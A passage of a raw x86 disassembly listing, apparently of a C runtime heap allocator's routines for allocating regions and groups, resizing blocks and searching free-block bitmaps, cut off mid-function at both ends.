  426958:	mov    DWORD PTR [esi],eax
  42695a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42695e:	mov    eax,DWORD PTR [ebp-0x10]
  426961:	dec    DWORD PTR [eax]
  426963:	jne    0x426a60
  426969:	mov    eax,ds:0x45def8
  42696e:	test   eax,eax
  426970:	je     0x426a52
  426976:	mov    ecx,DWORD PTR ds:0x45df10
  42697c:	mov    esi,DWORD PTR ds:0x4290ac
  426982:	push   0x4000
  426987:	shl    ecx,0xf
  42698a:	add    ecx,DWORD PTR [eax+0xc]
  42698d:	mov    ebx,0x8000
  426992:	push   ebx
  426993:	push   ecx
  426994:	call   esi
  426996:	mov    ecx,DWORD PTR ds:0x45df10
  42699c:	mov    eax,ds:0x45def8
  4269a1:	mov    edx,0x80000000
  4269a6:	shr    edx,cl
  4269a8:	or     DWORD PTR [eax+0x8],edx
  4269ab:	mov    eax,ds:0x45def8
  4269b0:	mov    eax,DWORD PTR [eax+0x10]
  4269b3:	mov    ecx,DWORD PTR ds:0x45df10
  4269b9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269c1:	mov    eax,ds:0x45def8
  4269c6:	mov    eax,DWORD PTR [eax+0x10]
  4269c9:	dec    BYTE PTR [eax+0x43]
  4269cc:	mov    eax,ds:0x45def8
  4269d1:	mov    ecx,DWORD PTR [eax+0x10]
  4269d4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269d8:	jne    0x4269e3
  4269da:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269de:	mov    eax,ds:0x45def8
  4269e3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269e7:	jne    0x426a52
  4269e9:	push   ebx
  4269ea:	push   0x0
  4269ec:	push   DWORD PTR [eax+0xc]
  4269ef:	call   esi
  4269f1:	mov    eax,ds:0x45def8
  4269f6:	push   DWORD PTR [eax+0x10]
  4269f9:	push   0x0
  4269fb:	push   DWORD PTR ds:0x45e140
  426a01:	call   DWORD PTR ds:0x42902c
  426a07:	mov    eax,ds:0x45defc
  426a0c:	mov    edx,DWORD PTR ds:0x45df00
  426a12:	lea    eax,[eax+eax*4]
  426a15:	shl    eax,0x2
  426a18:	mov    ecx,eax
  426a1a:	mov    eax,ds:0x45def8
  426a1f:	sub    ecx,eax
  426a21:	lea    ecx,[ecx+edx*1-0x14]
  426a25:	push   ecx
  426a26:	lea    ecx,[eax+0x14]
  426a29:	push   ecx
  426a2a:	push   eax
  426a2b:	call   0x428280
  426a30:	mov    eax,DWORD PTR [ebp+0x8]
  426a33:	add    esp,0xc
  426a36:	dec    DWORD PTR ds:0x45defc
  426a3c:	cmp    eax,DWORD PTR ds:0x45def8
  426a42:	jbe    0x426a48
  426a44:	sub    DWORD PTR [ebp+0x8],0x14
  426a48:	mov    eax,ds:0x45df00
  426a4d:	mov    ds:0x45df08,eax
  426a52:	mov    eax,DWORD PTR [ebp+0x8]
  426a55:	mov    ds:0x45def8,eax
  426a5a:	mov    DWORD PTR ds:0x45df10,edi
  426a60:	pop    ebx
  426a61:	pop    edi
  426a62:	pop    esi
  426a63:	leave  
  426a64:	ret    
  426a65:	mov    eax,ds:0x45defc
  426a6a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a70:	push   edi
  426a71:	xor    edi,edi
  426a73:	cmp    eax,ecx
  426a75:	jne    0x426aab
  426a77:	lea    eax,[ecx+ecx*4+0x50]
  426a7b:	shl    eax,0x2
  426a7e:	push   eax
  426a7f:	push   DWORD PTR ds:0x45df00
  426a85:	push   edi
  426a86:	push   DWORD PTR ds:0x45e140
  426a8c:	call   DWORD PTR ds:0x4290d0
  426a92:	cmp    eax,edi
  426a94:	jne    0x426a9a
  426a96:	xor    eax,eax
  426a98:	pop    edi
  426a99:	ret    
  426a9a:	add    DWORD PTR ds:0x45df0c,0x10
  426aa1:	mov    ds:0x45df00,eax
  426aa6:	mov    eax,ds:0x45defc
  426aab:	mov    ecx,DWORD PTR ds:0x45df00
  426ab1:	push   esi
  426ab2:	push   0x41c4
  426ab7:	push   0x8
  426ab9:	push   DWORD PTR ds:0x45e140
  426abf:	lea    eax,[eax+eax*4]
  426ac2:	lea    esi,[ecx+eax*4]
  426ac5:	call   DWORD PTR ds:0x429030
  426acb:	cmp    eax,edi
  426acd:	mov    DWORD PTR [esi+0x10],eax
  426ad0:	jne    0x426ad6
  426ad2:	xor    eax,eax
  426ad4:	jmp    0x426b19
  426ad6:	push   0x4
  426ad8:	push   0x2000
  426add:	push   0x100000
  426ae2:	push   edi
  426ae3:	call   DWORD PTR ds:0x4290cc
  426ae9:	cmp    eax,edi
  426aeb:	mov    DWORD PTR [esi+0xc],eax
  426aee:	jne    0x426b02
  426af0:	push   DWORD PTR [esi+0x10]
  426af3:	push   edi
  426af4:	push   DWORD PTR ds:0x45e140
  426afa:	call   DWORD PTR ds:0x42902c
  426b00:	jmp    0x426ad2
  426b02:	or     DWORD PTR [esi+0x8],0xffffffff
  426b06:	mov    DWORD PTR [esi],edi
  426b08:	mov    DWORD PTR [esi+0x4],edi
  426b0b:	inc    DWORD PTR ds:0x45defc
  426b11:	mov    eax,DWORD PTR [esi+0x10]
  426b14:	or     DWORD PTR [eax],0xffffffff
  426b17:	mov    eax,esi
  426b19:	pop    esi
  426b1a:	pop    edi
  426b1b:	ret    
  426b1c:	push   ebp
  426b1d:	mov    ebp,esp
  426b1f:	push   ecx
  426b20:	push   ecx
  426b21:	mov    ecx,DWORD PTR [ebp+0x8]
  426b24:	mov    eax,DWORD PTR [ecx+0x8]
  426b27:	push   ebx
  426b28:	push   esi
  426b29:	mov    esi,DWORD PTR [ecx+0x10]
  426b2c:	push   edi
  426b2d:	xor    ebx,ebx
  426b2f:	jmp    0x426b34
  426b31:	shl    eax,1
  426b33:	inc    ebx
  426b34:	test   eax,eax
  426b36:	jge    0x426b31
  426b38:	mov    eax,ebx
  426b3a:	imul   eax,eax,0x204
  426b40:	lea    eax,[eax+esi*1+0x144]
  426b47:	push   0x3f
  426b49:	mov    DWORD PTR [ebp-0x8],eax
  426b4c:	pop    edx
  426b4d:	mov    DWORD PTR [eax+0x8],eax
  426b50:	mov    DWORD PTR [eax+0x4],eax
  426b53:	add    eax,0x8
  426b56:	dec    edx
  426b57:	jne    0x426b4d
  426b59:	push   0x4
  426b5b:	mov    edi,ebx
  426b5d:	push   0x1000
  426b62:	shl    edi,0xf
  426b65:	add    edi,DWORD PTR [ecx+0xc]
  426b68:	push   0x8000
  426b6d:	push   edi
  426b6e:	call   DWORD PTR ds:0x4290cc
  426b74:	test   eax,eax
  426b76:	jne    0x426b80
  426b78:	or     eax,0xffffffff
  426b7b:	jmp    0x426c1d
  426b80:	lea    edx,[edi+0x7000]
  426b86:	cmp    edi,edx
  426b88:	mov    DWORD PTR [ebp-0x4],edx
  426b8b:	ja     0x426bd0
  426b8d:	mov    ecx,edx
  426b8f:	sub    ecx,edi
  426b91:	shr    ecx,0xc
  426b94:	lea    eax,[edi+0x10]
  426b97:	inc    ecx
  426b98:	or     DWORD PTR [eax-0x8],0xffffffff
  426b9c:	or     DWORD PTR [eax+0xfec],0xffffffff
  426ba3:	lea    edx,[eax+0xffc]
  426ba9:	mov    DWORD PTR [eax],edx
  426bab:	lea    edx,[eax-0x1004]
  426bb1:	mov    DWORD PTR [eax-0x4],0xff0
  426bb8:	mov    DWORD PTR [eax+0x4],edx
  426bbb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bc5:	add    eax,0x1000
  426bca:	dec    ecx
  426bcb:	jne    0x426b98
  426bcd:	mov    edx,DWORD PTR [ebp-0x4]
  426bd0:	mov    eax,DWORD PTR [ebp-0x8]
  426bd3:	add    eax,0x1f8
  426bd8:	lea    ecx,[edi+0xc]
  426bdb:	mov    DWORD PTR [eax+0x4],ecx
  426bde:	mov    DWORD PTR [ecx+0x8],eax
  426be1:	lea    ecx,[edx+0xc]
  426be4:	mov    DWORD PTR [eax+0x8],ecx
  426be7:	mov    DWORD PTR [ecx+0x4],eax
  426bea:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bef:	xor    edi,edi
  426bf1:	inc    edi
  426bf2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426bf9:	mov    al,BYTE PTR [esi+0x43]
  426bfc:	mov    cl,al
  426bfe:	inc    cl
  426c00:	test   al,al
  426c02:	mov    eax,DWORD PTR [ebp+0x8]
  426c05:	mov    BYTE PTR [esi+0x43],cl
  426c08:	jne    0x426c0d
  426c0a:	or     DWORD PTR [eax+0x4],edi
  426c0d:	mov    edx,0x80000000
  426c12:	mov    ecx,ebx
  426c14:	shr    edx,cl
  426c16:	not    edx
  426c18:	and    DWORD PTR [eax+0x8],edx
  426c1b:	mov    eax,ebx
  426c1d:	pop    edi
  426c1e:	pop    esi
  426c1f:	pop    ebx
  426c20:	leave  
  426c21:	ret    
  426c22:	push   ebp
  426c23:	mov    ebp,esp
  426c25:	sub    esp,0xc
  426c28:	mov    ecx,DWORD PTR [ebp+0x8]
  426c2b:	mov    eax,DWORD PTR [ecx+0x10]
  426c2e:	push   ebx
  426c2f:	push   esi
  426c30:	mov    esi,DWORD PTR [ebp+0x10]
  426c33:	push   edi
  426c34:	mov    edi,DWORD PTR [ebp+0xc]
  426c37:	mov    edx,edi
  426c39:	sub    edx,DWORD PTR [ecx+0xc]
  426c3c:	add    esi,0x17
  426c3f:	shr    edx,0xf
  426c42:	mov    ecx,edx
  426c44:	imul   ecx,ecx,0x204
  426c4a:	lea    ecx,[ecx+eax*1+0x144]
  426c51:	mov    DWORD PTR [ebp-0xc],ecx
  426c54:	mov    ecx,DWORD PTR [edi-0x4]
  426c57:	and    esi,0xfffffff0
  426c5a:	dec    ecx
  426c5b:	cmp    esi,ecx
  426c5d:	lea    edi,[ecx+edi*1-0x4]
  426c61:	mov    ebx,DWORD PTR [edi]
  426c63:	mov    DWORD PTR [ebp+0x10],ecx
  426c66:	mov    DWORD PTR [ebp-0x4],ebx
  426c69:	jle    0x426dc4
  426c6f:	test   bl,0x1
  426c72:	jne    0x426dbd
  426c78:	add    ebx,ecx
  426c7a:	cmp    esi,ebx
  426c7c:	jg     0x426dbd
  426c82:	mov    ecx,DWORD PTR [ebp-0x4]
  426c85:	sar    ecx,0x4
  426c88:	dec    ecx
  426c89:	cmp    ecx,0x3f
  426c8c:	mov    DWORD PTR [ebp-0x8],ecx
  426c8f:	jbe    0x426c97
  426c91:	push   0x3f
  426c93:	pop    ecx
  426c94:	mov    DWORD PTR [ebp-0x8],ecx
  426c97:	mov    ebx,DWORD PTR [edi+0x4]
  426c9a:	cmp    ebx,DWORD PTR [edi+0x8]
  426c9d:	jne    0x426ce2
  426c9f:	cmp    ecx,0x20
  426ca2:	mov    ebx,0x80000000
  426ca7:	jae    0x426cc3
  426ca9:	shr    ebx,cl
  426cab:	mov    ecx,DWORD PTR [ebp-0x8]
  426cae:	lea    ecx,[ecx+eax*1+0x4]
  426cb2:	not    ebx
  426cb4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cb8:	dec    BYTE PTR [ecx]
  426cba:	jne    0x426ce2
  426cbc:	mov    ecx,DWORD PTR [ebp+0x8]
  426cbf:	and    DWORD PTR [ecx],ebx
  426cc1:	jmp    0x426ce2
  426cc3:	add    ecx,0xffffffe0
  426cc6:	shr    ebx,cl
  426cc8:	mov    ecx,DWORD PTR [ebp-0x8]
  426ccb:	lea    ecx,[ecx+eax*1+0x4]
  426ccf:	not    ebx
  426cd1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426cd8:	dec    BYTE PTR [ecx]
  426cda:	jne    0x426ce2
  426cdc:	mov    ecx,DWORD PTR [ebp+0x8]
  426cdf:	and    DWORD PTR [ecx+0x4],ebx
  426ce2:	mov    ecx,DWORD PTR [edi+0x8]
  426ce5:	mov    ebx,DWORD PTR [edi+0x4]
  426ce8:	mov    DWORD PTR [ecx+0x4],ebx
  426ceb:	mov    ecx,DWORD PTR [edi+0x4]
  426cee:	mov    edi,DWORD PTR [edi+0x8]
  426cf1:	mov    DWORD PTR [ecx+0x8],edi
  426cf4:	mov    ecx,DWORD PTR [ebp+0x10]
  426cf7:	sub    ecx,esi
  426cf9:	add    DWORD PTR [ebp-0x4],ecx
  426cfc:	cmp    DWORD PTR [ebp-0x4],0x0
  426d00:	jle    0x426dab
  426d06:	mov    edi,DWORD PTR [ebp-0x4]
  426d09:	mov    ecx,DWORD PTR [ebp+0xc]
  426d0c:	sar    edi,0x4
  426d0f:	dec    edi
  426d10:	cmp    edi,0x3f
  426d13:	lea    ecx,[ecx+esi*1-0x4]
  426d17:	jbe    0x426d1c
  426d19:	push   0x3f
  426d1b:	pop    edi
  426d1c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d1f:	lea    ebx,[ebx+edi*8]
  426d22:	mov    DWORD PTR [ebp+0x10],ebx
  426d25:	mov    ebx,DWORD PTR [ebx+0x4]
  426d28:	mov    DWORD PTR [ecx+0x4],ebx
  426d2b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d2e:	mov    DWORD PTR [ecx+0x8],ebx
  426d31:	mov    DWORD PTR [ebx+0x4],ecx
  426d34:	mov    ebx,DWORD PTR [ecx+0x4]
  426d37:	mov    DWORD PTR [ebx+0x8],ecx
  426d3a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d3d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d40:	jne    0x426d99
  426d42:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d46:	mov    BYTE PTR [ebp+0x13],cl
  426d49:	inc    cl
  426d4b:	cmp    edi,0x20
  426d4e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d52:	jae    0x426d70
  426d54:	cmp    BYTE PTR [ebp+0x13],0x0
  426d58:	jne    0x426d68
  426d5a:	mov    ecx,edi
  426d5c:	mov    ebx,0x80000000
  426d61:	shr    ebx,cl
  426d63:	mov    ecx,DWORD PTR [ebp+0x8]
  426d66:	or     DWORD PTR [ecx],ebx
  426d68:	lea    eax,[eax+edx*4+0x44]
  426d6c:	mov    ecx,edi
  426d6e:	jmp    0x426d90
  426d70:	cmp    BYTE PTR [ebp+0x13],0x0
  426d74:	jne    0x426d86
  426d76:	lea    ecx,[edi-0x20]
  426d79:	mov    ebx,0x80000000
  426d7e:	shr    ebx,cl
  426d80:	mov    ecx,DWORD PTR [ebp+0x8]
  426d83:	or     DWORD PTR [ecx+0x4],ebx
  426d86:	lea    eax,[eax+edx*4+0xc4]
  426d8d:	lea    ecx,[edi-0x20]
  426d90:	mov    edx,0x80000000
  426d95:	shr    edx,cl
  426d97:	or     DWORD PTR [eax],edx
  426d99:	mov    edx,DWORD PTR [ebp+0xc]
  426d9c:	mov    ecx,DWORD PTR [ebp-0x4]
  426d9f:	lea    eax,[edx+esi*1-0x4]
  426da3:	mov    DWORD PTR [eax],ecx
  426da5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426da9:	jmp    0x426dae
  426dab:	mov    edx,DWORD PTR [ebp+0xc]
  426dae:	lea    eax,[esi+0x1]
  426db1:	mov    DWORD PTR [edx-0x4],eax
  426db4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426db8:	jmp    0x426ef9
  426dbd:	xor    eax,eax
  426dbf:	jmp    0x426efc
  426dc4:	jge    0x426ef9
  426dca:	mov    ebx,DWORD PTR [ebp+0xc]
  426dcd:	sub    DWORD PTR [ebp+0x10],esi
  426dd0:	lea    ecx,[esi+0x1]
  426dd3:	mov    DWORD PTR [ebx-0x4],ecx
  426dd6:	lea    ebx,[ebx+esi*1-0x4]
  426dda:	mov    esi,DWORD PTR [ebp+0x10]
  426ddd:	sar    esi,0x4
  426de0:	dec    esi
  426de1:	cmp    esi,0x3f
  426de4:	mov    DWORD PTR [ebp+0xc],ebx
  426de7:	mov    DWORD PTR [ebx-0x4],ecx
  426dea:	jbe    0x426def
  426dec:	push   0x3f
  426dee:	pop    esi
  426def:	test   BYTE PTR [ebp-0x4],0x1
  426df3:	jne    0x426e79
  426df9:	mov    esi,DWORD PTR [ebp-0x4]
  426dfc:	sar    esi,0x4
  426dff:	dec    esi
  426e00:	cmp    esi,0x3f
  426e03:	jbe    0x426e08
  426e05:	push   0x3f
  426e07:	pop    esi
  426e08:	mov    ecx,DWORD PTR [edi+0x4]
  426e0b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e0e:	jne    0x426e52
  426e10:	cmp    esi,0x20
  426e13:	mov    ebx,0x80000000
  426e18:	jae    0x426e33
  426e1a:	mov    ecx,esi
  426e1c:	shr    ebx,cl
  426e1e:	lea    esi,[esi+eax*1+0x4]
  426e22:	not    ebx
  426e24:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e28:	dec    BYTE PTR [esi]
  426e2a:	jne    0x426e4f
  426e2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e2f:	and    DWORD PTR [ecx],ebx
  426e31:	jmp    0x426e4f
  426e33:	lea    ecx,[esi-0x20]
  426e36:	shr    ebx,cl
  426e38:	lea    ecx,[esi+eax*1+0x4]
  426e3c:	not    ebx
  426e3e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e45:	dec    BYTE PTR [ecx]
  426e47:	jne    0x426e4f
  426e49:	mov    ecx,DWORD PTR [ebp+0x8]
  426e4c:	and    DWORD PTR [ecx+0x4],ebx
  426e4f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e52:	mov    ecx,DWORD PTR [edi+0x8]
  426e55:	mov    esi,DWORD PTR [edi+0x4]
  426e58:	mov    DWORD PTR [ecx+0x4],esi
  426e5b:	mov    esi,DWORD PTR [edi+0x8]
  426e5e:	mov    ecx,DWORD PTR [edi+0x4]
  426e61:	mov    DWORD PTR [ecx+0x8],esi
  426e64:	mov    esi,DWORD PTR [ebp+0x10]
  426e67:	add    esi,DWORD PTR [ebp-0x4]
  426e6a:	mov    DWORD PTR [ebp+0x10],esi
  426e6d:	sar    esi,0x4
  426e70:	dec    esi
  426e71:	cmp    esi,0x3f
  426e74:	jbe    0x426e79
  426e76:	push   0x3f
  426e78:	pop    esi
  426e79:	mov    ecx,DWORD PTR [ebp-0xc]
  426e7c:	lea    ecx,[ecx+esi*8]
  426e7f:	mov    edi,DWORD PTR [ecx+0x4]
  426e82:	mov    DWORD PTR [ebx+0x8],ecx
  426e85:	mov    DWORD PTR [ebx+0x4],edi
  426e88:	mov    DWORD PTR [ecx+0x4],ebx
  426e8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e8e:	mov    DWORD PTR [ecx+0x8],ebx
  426e91:	mov    ecx,DWORD PTR [ebx+0x4]
  426e94:	cmp    ecx,DWORD PTR [ebx+0x8]
  426e97:	jne    0x426ef0
  426e99:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426e9d:	mov    BYTE PTR [ebp+0xf],cl
  426ea0:	inc    cl
  426ea2:	cmp    esi,0x20
  426ea5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426ea9:	jae    0x426ec7
  426eab:	cmp    BYTE PTR [ebp+0xf],0x0
  426eaf:	jne    0x426ebf
  426eb1:	mov    ecx,esi
  426eb3:	mov    edi,0x80000000
  426eb8:	shr    edi,cl
  426eba:	mov    ecx,DWORD PTR [ebp+0x8]
  426ebd:	or     DWORD PTR [ecx],edi
  426ebf:	lea    eax,[eax+edx*4+0x44]
  426ec3:	mov    ecx,esi
  426ec5:	jmp    0x426ee7
  426ec7:	cmp    BYTE PTR [ebp+0xf],0x0
  426ecb:	jne    0x426edd
  426ecd:	lea    ecx,[esi-0x20]
  426ed0:	mov    edi,0x80000000
  426ed5:	shr    edi,cl
  426ed7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eda:	or     DWORD PTR [ecx+0x4],edi
  426edd:	lea    eax,[eax+edx*4+0xc4]
  426ee4:	lea    ecx,[esi-0x20]
  426ee7:	mov    edx,0x80000000
  426eec:	shr    edx,cl
  426eee:	or     DWORD PTR [eax],edx
  426ef0:	mov    eax,DWORD PTR [ebp+0x10]
  426ef3:	mov    DWORD PTR [ebx],eax
  426ef5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426ef9:	xor    eax,eax
  426efb:	inc    eax
  426efc:	pop    edi
  426efd:	pop    esi
  426efe:	pop    ebx
  426eff:	leave  
  426f00:	ret    
  426f01:	push   ebp
  426f02:	mov    ebp,esp
  426f04:	sub    esp,0x14
  426f07:	mov    ecx,DWORD PTR [ebp+0x8]
  426f0a:	mov    eax,ds:0x45defc
  426f0f:	mov    edx,DWORD PTR ds:0x45df00
  426f15:	add    ecx,0x17
  426f18:	and    ecx,0xfffffff0
  426f1b:	push   ebx
  426f1c:	mov    DWORD PTR [ebp-0x10],ecx
  426f1f:	sar    ecx,0x4
  426f22:	push   esi
  426f23:	lea    eax,[eax+eax*4]
  426f26:	push   edi
  426f27:	dec    ecx
  426f28:	cmp    ecx,0x20
  426f2b:	lea    edi,[edx+eax*4]
  426f2e:	mov    DWORD PTR [ebp-0x4],edi
  426f31:	jge    0x426f3e
  426f33:	or     esi,0xffffffff
  426f36:	shr    esi,cl
  426f38:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f3c:	jmp    0x426f4b
  426f3e:	add    ecx,0xffffffe0
  426f41:	or     eax,0xffffffff
  426f44:	xor    esi,esi
  426f46:	shr    eax,cl
  426f48:	mov    DWORD PTR [ebp-0x8],eax
  426f4b:	mov    eax,ds:0x45df08
  426f50:	mov    ebx,eax
  426f52:	mov    DWORD PTR [ebp-0xc],esi
  426f55:	cmp    ebx,edi
  426f57:	jmp    0x426f6d
  426f59:	mov    ecx,DWORD PTR [ebx+0x4]
  426f5c:	mov    edi,DWORD PTR [ebx]
  426f5e:	and    ecx,DWORD PTR [ebp-0x8]
  426f61:	and    edi,esi
  426f63:	or     ecx,edi
  426f65:	jne    0x426f72
  426f67:	add    ebx,0x14
  426f6a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f6d:	mov    DWORD PTR [ebp+0x8],ebx
  426f70:	jb     0x426f59
  426f72:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f75:	jne    0x426f9b
  426f77:	mov    ebx,edx
  426f79:	jmp    0x426f8c
  426f7b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f7e:	mov    edi,DWORD PTR [ebx]
  426f80:	and    ecx,DWORD PTR [ebp-0x8]
  426f83:	and    edi,esi
  426f85:	or     ecx,edi
  426f87:	jne    0x426f93
  426f89:	add    ebx,0x14
  426f8c:	cmp    ebx,eax
  426f8e:	mov    DWORD PTR [ebp+0x8],ebx
  426f91:	jb     0x426f7b
  426f93:	cmp    ebx,eax
  426f95:	je     0x42702f
  426f9b:	mov    DWORD PTR ds:0x45df08,ebx
  426fa1:	mov    eax,DWORD PTR [ebx+0x10]
  426fa4:	mov    edx,DWORD PTR [eax]
  426fa6:	cmp    edx,0xffffffff
  426fa9:	mov    DWORD PTR [ebp-0x4],edx
  426fac:	je     0x426fc2
  426fae:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fb5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fb9:	and    ecx,DWORD PTR [ebp-0x8]
  426fbc:	and    edi,esi
  426fbe:	or     ecx,edi
  426fc0:	jne    0x426ff8
  426fc2:	mov    edx,DWORD PTR [eax+0xc4]
  426fc8:	and    edx,DWORD PTR [ebp-0x8]
  426fcb:	and    DWORD PTR [ebp-0x4],0x0
  426fcf:	lea    ecx,[eax+0x44]
  426fd2:	mov    esi,DWORD PTR [ecx]
  426fd4:	and    esi,DWORD PTR [ebp-0xc]
  426fd7:	or     edx,esi
  426fd9:	mov    esi,DWORD PTR [ebp-0xc]
  426fdc:	jne    0x426ff5
  426fde:	mov    edx,DWORD PTR [ecx+0x84]
  426fe4:	and    edx,DWORD PTR [ebp-0x8]
  426fe7:	inc    DWORD PTR [ebp-0x4]
  426fea:	add    ecx,0x4
  426fed:	mov    edi,DWORD PTR [ecx]
  426fef:	and    edi,esi
  426ff1:	or     edx,edi
  426ff3:	je     0x426fde
  426ff5:	mov    edx,DWORD PTR [ebp-0x4]
  426ff8:	mov    ecx,edx
  426ffa:	imul   ecx,ecx,0x204
  427000:	lea    ecx,[ecx+eax*1+0x144]
  427007:	mov    DWORD PTR [ebp-0xc],ecx
  42700a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42700e:	xor    edi,edi
  427010:	and    ecx,esi
  427012:	jne    0x427081
  427014:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42701b:	and    ecx,DWORD PTR [ebp-0x8]
  42701e:	push   0x20
  427020:	pop    edi
  427021:	jmp    0x427081
  427023:	cmp    DWORD PTR [ebx+0x8],0x0
  427027:	jne    0x427034
  427029:	add    ebx,0x14
  42702c:	mov    DWORD PTR [ebp+0x8],ebx
  42702f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427032:	jb     0x427023
  427034:	cmp    ebx,DWORD PTR [ebp-0x4]
  427037:	jne    0x42705f
  427039:	mov    ebx,edx
  42703b:	jmp    0x427046
  42703d:	cmp    DWORD PTR [ebx+0x8],0x0
  427041:	jne    0x42704d
  427043:	add    ebx,0x14
  427046:	cmp    ebx,eax
  427048:	mov    DWORD PTR [ebp+0x8],ebx
  42704b:	jb     0x42703d
  42704d:	cmp    ebx,eax
  42704f:	jne    0x42705f
  427051:	call   0x426a65
  427056:	mov    ebx,eax
  427058:	test   ebx,ebx
  42705a:	mov    DWORD PTR [ebp+0x8],ebx
  42705d:	je     0x427077
  42705f:	push   ebx
  427060:	call   0x426b1c
  427065:	pop    ecx
  427066:	mov    ecx,DWORD PTR [ebx+0x10]
  427069:	mov    DWORD PTR [ecx],eax
  42706b:	mov    eax,DWORD PTR [ebx+0x10]
  42706e:	cmp    DWORD PTR [eax],0xffffffff
  427071:	jne    0x426f9b
  427077:	xor    eax,eax
  427079:	jmp    0x4271f8
  42707e:	shl    ecx,1
  427080:	inc    edi
  427081:	test   ecx,ecx
  427083:	jge    0x42707e
  427085:	mov    ecx,DWORD PTR [ebp-0xc]
  427088:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42708c:	mov    ecx,DWORD PTR [edx]
  42708e:	sub    ecx,DWORD PTR [ebp-0x10]
  427091:	mov    esi,ecx
  427093:	sar    esi,0x4
  427096:	dec    esi
  427097:	cmp    esi,0x3f
  42709a:	mov    DWORD PTR [ebp-0x8],ecx
  42709d:	jle    0x4270a2
  42709f:	push   0x3f
  4270a1:	pop    esi
  4270a2:	cmp    esi,edi
  4270a4:	je     0x4271ab
  4270aa:	mov    ecx,DWORD PTR [edx+0x4]
  4270ad:	cmp    ecx,DWORD PTR [edx+0x8]
  4270b0:	jne    0x42710e
  4270b2:	cmp    edi,0x20
  4270b5:	mov    ebx,0x80000000
  4270ba:	jge    0x4270e2
  4270bc:	mov    ecx,edi
  4270be:	shr    ebx,cl
  4270c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270c3:	lea    edi,[eax+edi*1+0x4]
  4270c7:	not    ebx
  4270c9:	mov    DWORD PTR [ebp-0x14],ebx
  4270cc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270d0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270d4:	dec    BYTE PTR [edi]
  4270d6:	jne    0x42710b
  4270d8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270db:	mov    ebx,DWORD PTR [ebp+0x8]
  4270de:	and    DWORD PTR [ebx],ecx
  4270e0:	jmp    0x42710e
  4270e2:	lea    ecx,[edi-0x20]
  4270e5:	shr    ebx,cl
  4270e7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270ea:	lea    ecx,[eax+ecx*4+0xc4]
  4270f1:	lea    edi,[eax+edi*1+0x4]
  4270f5:	not    ebx
  4270f7:	and    DWORD PTR [ecx],ebx
  4270f9:	dec    BYTE PTR [edi]
  4270fb:	mov    DWORD PTR [ebp-0x14],ebx
  4270fe:	jne    0x42710b
  427100:	mov    ebx,DWORD PTR [ebp+0x8]
  427103:	mov    ecx,DWORD PTR [ebp-0x14]
  427106:	and    DWORD PTR [ebx+0x4],ecx
  427109:	jmp    0x42710e
  42710b:	mov    ebx,DWORD PTR [ebp+0x8]
  42710e:	cmp    DWORD PTR [ebp-0x8],0x0
  427112:	mov    ecx,DWORD PTR [edx+0x8]
  427115:	mov    edi,DWORD PTR [edx+0x4]
  427118:	mov    DWORD PTR [ecx+0x4],edi
  42711b:	mov    ecx,DWORD PTR [edx+0x4]
  42711e:	mov    edi,DWORD PTR [edx+0x8]
  427121:	mov    DWORD PTR [ecx+0x8],edi
  427124:	je     0x4271b7
  42712a:	mov    ecx,DWORD PTR [ebp-0xc]
  42712d:	lea    ecx,[ecx+esi*8]
  427130:	mov    edi,DWORD PTR [ecx+0x4]
  427133:	mov    DWORD PTR [edx+0x8],ecx
  427136:	mov    DWORD PTR [edx+0x4],edi
  427139:	mov    DWORD PTR [ecx+0x4],edx
  42713c:	mov    ecx,DWORD PTR [edx+0x4]
  42713f:	mov    DWORD PTR [ecx+0x8],edx
  427142:	mov    ecx,DWORD PTR [edx+0x4]
  427145:	cmp    ecx,DWORD PTR [edx+0x8]
  427148:	jne    0x4271a8
  42714a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42714e:	mov    BYTE PTR [ebp+0xb],cl
  427151:	inc    cl
  427153:	cmp    esi,0x20
  427156:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42715a:	jge    0x42717f
  42715c:	cmp    BYTE PTR [ebp+0xb],0x0
  427160:	jne    0x42716d
  427162:	mov    edi,0x80000000
  427167:	mov    ecx,esi
  427169:	shr    edi,cl
  42716b:	or     DWORD PTR [ebx],edi
  42716d:	mov    ecx,esi
  42716f:	mov    edi,0x80000000
